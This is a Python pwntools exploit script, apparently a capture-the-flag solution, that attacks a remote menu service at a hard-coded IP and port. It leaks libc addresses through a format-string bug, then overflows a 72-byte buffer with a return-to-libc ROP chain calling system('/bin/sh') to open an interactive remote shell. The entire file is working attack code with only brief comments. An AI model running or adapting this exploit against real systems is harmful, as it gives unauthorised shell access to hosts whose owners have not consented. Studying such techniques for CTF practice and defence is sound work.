#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '212.2.248.184'
PORT = 31451

# libc_correct.so (Ubuntu GLIBC 2.39) offsets
LIBC_RET = 0x2a1ca     # __libc_start_call_main ret (fmt pos 35)
STDIN    = 0x2038e0    # _IO_2_1_stdin_ (fmt pos 7, for verification)
SYSTEM   = 0x58750
BIN_SH   = 0x1cb42f
POP_RDI  = 0x10f78b
RET      = 0x2882f      # ret gadget for stack alignment

def exploit():
    r = remote(HOST, PORT)
    r.recvuntil(b'3. Exit\n')

    # Leak libc via format string (option 1)
    r.sendline(b'1')
    r.recvuntil(b'Log a note:\n')
    r.sendline(b'%7$p|%35$p')
    data = r.recvline().decode().strip().split('|')
    stdin_leak = int(data[0], 16)
    libc_base = int(data[1], 16) - LIBC_RET
    assert libc_base + STDIN == stdin_leak
    log.success(f'libc base: {hex(libc_base)}')

    # Overflow option 2: buf=72, no canary, ret at offset 72
    r.recvuntil(b'3. Exit\n')
    r.sendline(b'2')
    r.recvuntil(b'Enter your secret info:\n')

    payload  = b'A' * 72
    payload += p64(libc_base + RET)       # stack alignment
    payload += p64(libc_base + POP_RDI)
    payload += p64(libc_base + BIN_SH)
    payload += p64(libc_base + SYSTEM)

    r.send(payload + b'\n')
    sleep(0.5)

    r.interactive()

if __name__ == '__main__':
    exploit()
